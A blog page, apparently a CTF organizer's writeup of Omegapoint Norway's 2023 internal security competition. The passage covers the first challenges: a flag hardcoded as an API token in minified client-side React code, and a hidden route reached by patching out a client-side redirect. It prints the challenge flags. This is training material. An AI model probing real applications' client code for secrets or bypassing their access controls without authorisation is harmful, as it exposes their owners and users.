@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+
+    <!-- *** favicon *** -->
+    <link rel="icon" type="image/svg+xml" href="../favicon.svg" />
+    <link rel="apple-touch-icon" sizes="180x180" href="../apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="../favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="../favicon-16x16.png" />
+    <link rel="mask-icon" href="../safari-pinned-tab.svg" color="#523fce" />
+    <meta name="msapplication-TileColor" content="#ffffff" />
+    <meta name="theme-color" content="#ffffff" />
+
+    <!-- *** common *** -->
+    <meta property="og:type" content="https://shirajuki.js.org/logo.webp" />
+    <meta property="og:url" content="https://shirajuki.js.org/" />
+    <meta property="og:title" content="Shirajuki - A norwegian CTF player @bootplug and @corax" />
+    <meta property="og:site_name" content="Shirajuki" />
+    <meta property="og:description" content="Shirajuki - A norwegian CTF player @bootplug and @corax" />
+    <meta property="og:image" content="https://jonny.js.org/logo.webp" />
+    <meta property="og:locale" content="en_EN" />
+    <!-- *** Twitter *** -->
+    <meta name="twitter:card" content="Shirajuki - A norwegian CTF player @bootplug and @corax" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="content-security-policy" content=""><title>Writeup: Omegapoint Norway's Cybersecurity Awareness CTF 2023</title><meta property="og:title" content="Writeup: Omegapoint Norway's Cybersecurity Awareness CTF 2023" data-svelte="svelte-15w3rt">
+	<link href="/_app/immutable/assets/__layout-84053e34.css" rel="stylesheet">
+	<link href="/_app/immutable/assets/layout-612e0798.css" rel="stylesheet">
+	<link rel="modulepreload" href="/_app/immutable/start-91df4be7.js">
+	<link rel="modulepreload" href="/_app/immutable/chunks/index-2b5eadba.js">
+	<link rel="modulepreload" href="/_app/immutable/chunks/index-af51f98b.js">
+	<link rel="modulepreload" href="/_app/immutable/pages/__layout.svelte-cabac37c.js">
+	<link rel="modulepreload" href="/_app/immutable/chunks/stores-f88c56d4.js">
+	<link rel="modulepreload" href="/_app/immutable/chunks/index-94d4402f.js">
+	<link rel="modulepreload" href="/_app/immutable/pages/blog/omegapoint-ctf-2023.md-2580a4bd.js">
+	<link rel="modulepreload" href="/_app/immutable/chunks/layout-4590ce8c.js">
+	<link rel="modulepreload" href="/_app/immutable/chunks/utils-e126d158.js">
+  </head>
+  <body>
+    <div>
+
+
+<header class="show svelte-fvi1vf"><div class="corner svelte-fvi1vf"><a sveltekit:prefetch href="/" class="svelte-fvi1vf"><img src="data:image/webp;base64,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" alt="Logo" class="svelte-fvi1vf"></a></div>
+
+  <nav class="svelte-fvi1vf"><ul class="svelte-fvi1vf"><li class="svelte-fvi1vf"><a sveltekit:prefetch href="/" class="svelte-fvi1vf">Home</a></li>
+      <li class="svelte-fvi1vf"><a sveltekit:prefetch href="/about" class="svelte-fvi1vf">About</a></li>
+      <li class="svelte-fvi1vf active"><a sveltekit:prefetch href="/blog" class="svelte-fvi1vf">Blog</a></li></ul></nav>
+
+  <div class="corner svelte-fvi1vf"></div>
+</header>
+
+
+
+<main class="svelte-2wbpbt">
+
+<section class="content"><div><h1>Writeup: Omegapoint Norway's Cybersecurity Awareness CTF 2023</h1>
+
+  <p>January 15, 2024
+    ·
+    <span>Category: <a href="/blog/category/writeup">writeup</a></span></p>
+
+  <p>Tags:
+    <span><a href="/blog/tags/omegapoint-ctf">omegapoint-ctf</a>
+      </span><span><a href="/blog/tags/ctf">ctf</a>
+      </span></p></div>
+
+<p>During the Cybersecurity Awareness Month 2023, I was handed the awesome responsibility of organizing Omegapoint Norway’s very first internal security Capture The Flag (CTF) competition, extending the invitation not only to our Norwegian employees but also to our colleagues in Sweden.</p>
+<p>Putting together a security competition like this took a lot of planning, but it was worth every bit of effort. Setting up the challenges, managing the infrastructure, and making sure the competition ran smoothly taught me a lot. It was a great learning experience for both myself and all involved. I believe that this event served as an engaging learning platform, offering participants a gamified pathway to delve deeper into security. The challenges covered real-world security topics, making it a fun and educational experience for all participants.</p>
+<p>Spanning a duration of two months, over 40 employees joined in and participated, taking on a series of 13 challenges worth a total of 1300 points as the maximum total score. Tailored specifically for Omegapoint’s pentesters and developers, the challenges primarily focused on typical developer mistakes as well as the various aspects of web application security.</p>
+<p><img src="https://hackmd.io/_uploads/r1SC9AqdT.png" alt="list over the scenario-based challenges"></p>
+<p>Seeing so many Omegapoint colleagues get involved and engaged with the challenges made it all worthwhile. It was amazing to see everyone learning and having a great time solving challenges related to security. In this writeup, I’d like to give a summary on the scenario-based challenges along with their respective solutions.</p>
+<p><img src="https://hackmd.io/_uploads/Bk-Hs0qua.png" alt="The final scoreboard"></p>
+<p><img src="https://hackmd.io/_uploads/HyuvjC5up.png" alt="Statistics: total solve count by challenges"></p>
+<p><img src="https://hackmd.io/_uploads/ByJ_oCc_6.png" alt="Statistics: solve percentages per challenge"></p>
+<h2 id="0-the-beginning"><a href="#0-the-beginning">[0] The Beginning</a></h2>
+<h3 id="description"><a href="#description">Description</a></h3>
+<blockquote><p>Omegapoint is gearing up for Cybersecurity Awareness Month, and the management team has hidden secret cybersecurity manuals for the worthy employees. Explore the newly developed note-taking application at <code>xxx:yyy</code> to find the hidden treasures and embark on your cybersecurity journey!</p>
+<p>NOTE: use the user <code>guest:guest</code> if you want to test the application out! The note dashboard are currently only available for admin users.</p></blockquote>
+<h3 id="solution"><a href="#solution">Solution</a></h3>
+<p>To begin with, the scenario-based challenges in this CTF are a set of 10 interconnected challenges based on the same scenario, and is made in such way that the participants has to pivot and get foothold on multiple hosts in the same network. In this case, the participants are supposed to take the role as a pentester aiming to get a foothold on an internal note-taking application. One does not necessarily have to solve all the challenges in the intended order.</p>
+<p>The first challenge serves as an introduction, presenting participants with a URL directing them to the aforementioned note-taking application, along with guest credentials: <code>guest:guest</code>. This initial challenge is designed for exploration, requiring participants to navigate to the site and engage with it. The flag, representing successful completion of the challenge, is found in the “about” page, accompanied by a brief overview on the concept of Capture the Flag.</p>
+<p><img src="https://hackmd.io/_uploads/Bkerp69_6.png" alt="the initial homepage"></p>
+<h3 id="flag"><a href="#flag">Flag</a></h3>
+<p><code>OMEGAPOINT{83f05caf1127df716c253fc340fe87d3}</code></p>
+<h2 id="1-never-trust-the-client"><a href="#1-never-trust-the-client">[1] Never trust the Client</a></h2>
+<h3 id="description-1"><a href="#description-1">Description</a></h3>
+<blockquote><p>How does one truly embark on the hunt for hidden secrets within a supposedly sourceless web application? But wait, is a client-side web application truly sourceless?</p></blockquote>
+<h3 id="solution-1"><a href="#solution-1">Solution</a></h3>
+<p>Figuring out the underlying technlogies and frameworks used in a website is not only useful for a pentester working in a black-box environment, but it can also be useful for developers if they ever intend to take parts of the page as inspiration for their own work. A simple way of figuring this out can be done using the <code>devtools</code> which is a browser built-in tool one can use to help with the development of websites such as inspecting the DOM elements, checking the network traffics, memory profiling, etc…</p>
+<p>Upon inspecting the source code through the <code>devtools</code>, it is revealed that this is a web application built with <code>Vite</code> (a build tool that handles things such as the build and bundle of the source code), coupled with client-side <code>React</code> (a js framework that eases web application development). Given its nature as a client-side web application, the whole source code is therefore provided directly to the user so that the page can be rendered by the user’s browser. Consequently, everything developed by the developer is accessible to the users. Although the bundled source code slightly differs from the original, thanks to obfuscation through code minification and bundling of various libraries, relying solely on obfuscation for security isn’t foolproof. Secrets such as API tokens or environment variables that is not supposed to be available for the client user should therefore not be included in such applications.</p>
+<p>Digging into the source code while searching for the flag format <code>OMEGAPOINT{</code> unveils the flag. This flag operates as a token within an endpoint transmitted to the backend API for retrieving notes, as shown in the following code snippet:</p>
+<pre class="language-js"><!-- HTML_TAG_START --><code class="language-js"><span class="token keyword">const</span> Yy <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token constant">URL</span><span class="token operator">:</span> <span class="token string">"/api"</span>
+<span class="token punctuation">&#125;</span>
+  <span class="token punctuation">,</span> <span class="token function-variable function">QC</span> <span class="token operator">=</span> <span class="token keyword">async</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">&#96;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>Yy<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/notes?token=OMEGAPOINT&#123;7c0e12caf742bf36e604250fa8cc70fd&#125;</span><span class="token template-punctuation string">&#96;</span></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">Authorization</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">&#96;</span><span class="token string">Bearer </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">Pg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">&#96;</span></span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><!-- HTML_TAG_END --></pre>
+<p>This identification of the flag’s presence underscores the importance of securing sensitive data within client-side applications, reinforcing the notion that certain information, like important API tokens, shouldn’t be exposed within such contexts.</p>
+<h3 id="flag-1"><a href="#flag-1">Flag</a></h3>
+<p><code>OMEGAPOINT{7c0e12caf742bf36e604250fa8cc70fd}</code></p>
+<h2 id="2-whats-the-deal-with-dashboards"><a href="#2-whats-the-deal-with-dashboards">[2] What’s the deal with Dashboards?</a></h2>
+<h3 id="description-2"><a href="#description-2">Description</a></h3>
+<blockquote><p>You get a dashboard, and you get a dashboard. Everyone gets a dashboard! Are you able to find the hidden dashboard and discover what’s shown within it?</p></blockquote>
+<h3 id="solution-2"><a href="#solution-2">Solution</a></h3>
+<p>Understanding that the web application relies on React on the client-side, it’s logical to expect that the bundled code at the top section contains the libraries and the original developer-written code at the bottom. Armed with this insight, one can easily figure out the application logic. A thorough examination of this section unveils the various endpoints accessible within this Single Page Application (SPA). Among these, the path <code>/yet_another_dashboard_nice</code> distinctly stands out from all the endpoints:</p>
+<pre class="language-js"><!-- HTML_TAG_START --><code class="language-js"><span class="token keyword">const</span> nk <span class="token operator">=</span> <span class="token function">zx</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">"/"</span><span class="token punctuation">,</span>
+    <span class="token literal-property property">element</span><span class="token operator">:</span> <span class="token constant">M</span><span class="token punctuation">.</span><span class="token function">jsx</span><span class="token punctuation">(</span><span class="token constant">YC</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">"/login"</span><span class="token punctuation">,</span>
+    <span class="token literal-property property">element</span><span class="token operator">:</span> <span class="token constant">M</span><span class="token punctuation">.</span><span class="token function">jsx</span><span class="token punctuation">(</span>qC<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">"/logout"</span><span class="token punctuation">,</span>
+    <span class="token literal-property property">element</span><span class="token operator">:</span> <span class="token constant">M</span><span class="token punctuation">.</span><span class="token function">jsx</span><span class="token punctuation">(</span>tk<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">"/about"</span><span class="token punctuation">,</span>
+    <span class="token literal-property property">element</span><span class="token operator">:</span> <span class="token constant">M</span><span class="token punctuation">.</span><span class="token function">jsx</span><span class="token punctuation">(</span>ek<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">"/dashboard"</span><span class="token punctuation">,</span>
+    <span class="token literal-property property">element</span><span class="token operator">:</span> <span class="token constant">M</span><span class="token punctuation">.</span><span class="token function">jsx</span><span class="token punctuation">(</span><span class="token constant">XC</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">"/yet_another_dashboard_nice"</span><span class="token punctuation">,</span>
+    <span class="token literal-property property">element</span><span class="token operator">:</span> <span class="token constant">M</span><span class="token punctuation">.</span><span class="token function">jsx</span><span class="token punctuation">(</span><span class="token constant">ZC</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ml<span class="token punctuation">.</span><span class="token function">createRoot</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token constant">M</span><span class="token punctuation">.</span><span class="token function">jsxs</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>StrictMode<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token constant">M</span><span class="token punctuation">.</span><span class="token function">jsx</span><span class="token punctuation">(</span>Mx<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">router</span><span class="token operator">:</span> nk
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">M</span><span class="token punctuation">.</span><span class="token function">jsx</span><span class="token punctuation">(</span>sw<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><!-- HTML_TAG_END --></pre>
+<p>Upon navigating to this endpoint, an unexpected redirect occurs, leading back to the homepage. Reviewing the source code indicates that the React component associated with this endpoint is denoted as <code>ZC()</code>. A closer inspection of its code structure shows that it is simply a page containing some text and an image, forming a basic page layout.</p>
+<p>The redirect issue seems to stem from the execution of an useEffect-hook during the initial rendering phase:</p>
+<pre class="language-js"><!-- HTML_TAG_START --><code class="language-js"><span class="token keyword">function</span> <span class="token constant">ZC</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> e <span class="token operator">=</span> <span class="token function">yi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token constant">R</span><span class="token punctuation">.</span><span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>
+        <span class="token function">e</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">,</span> <span class="token punctuation">[</span>e<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token constant">M</span><span class="token punctuation">.</span><span class="token function">jsxs</span><span class="token punctuation">(</span><span class="token constant">M</span><span class="token punctuation">.</span>Fragment<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token constant">M</span><span class="token punctuation">.</span><span class="token function">jsx</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">M</span><span class="token punctuation">.</span><span class="token function">jsxs</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+            <span class="token literal-property property">className</span><span class="token operator">:</span> <span class="token string">"px-4 max-w-[1080px] mx-auto"</span><span class="token punctuation">,</span>
+            <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token constant">M</span><span class="token punctuation">.</span><span class="token function">jsx</span><span class="token punctuation">(</span><span class="token string">"h1"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+                <span class="token literal-property property">className</span><span class="token operator">:</span> <span class="token string">"text-2xl font-bold pb-6"</span><span class="token punctuation">,</span>
+                <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token string">"Just a dashboard"</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">M</span><span class="token punctuation">.</span><span class="token function">jsx</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+                <span class="token literal-property property">className</span><span class="token operator">:</span> <span class="token string">"pb-4 text-sm"</span><span class="token punctuation">,</span>
+                <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token string">"Here's another dashboard for you!"</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">M</span><span class="token punctuation">.</span><span class="token function">jsx</span><span class="token punctuation">(</span><span class="token string">"img"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+                <span class="token literal-property property">src</span><span class="token operator">:</span> <span class="token string">"/dashboard_image.png"</span><span class="token punctuation">,</span>
+                <span class="token literal-property property">alt</span><span class="token operator">:</span> <span class="token string">"simply an image"</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">M</span><span class="token punctuation">.</span><span class="token function">jsx</span><span class="token punctuation">(</span>ro<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">M</span><span class="token punctuation">.</span><span class="token function">jsx</span><span class="token punctuation">(</span>no<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
+<p>Utilizing Chrome’s capability for live file edits presents a simple workaround. By simply patching out the triggering of the <code>useEffect</code> function, one can bypass the redirect and directly access the endpoint housing the flag. Alternatively, one could also access the image directly by navigating to the <code>/dashboard_image.png</code> endpoint.</p>
